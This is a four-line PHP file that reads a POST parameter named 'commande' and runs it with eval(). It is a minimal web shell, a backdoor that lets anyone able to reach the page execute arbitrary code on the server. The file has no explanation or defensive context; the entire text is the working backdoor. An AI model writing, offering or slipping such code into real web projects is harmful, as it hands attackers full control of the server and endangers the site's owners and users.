<?php

$commande = (!empty($_POST['commande'])) ? $_POST['commande'] : '';
eval($commande);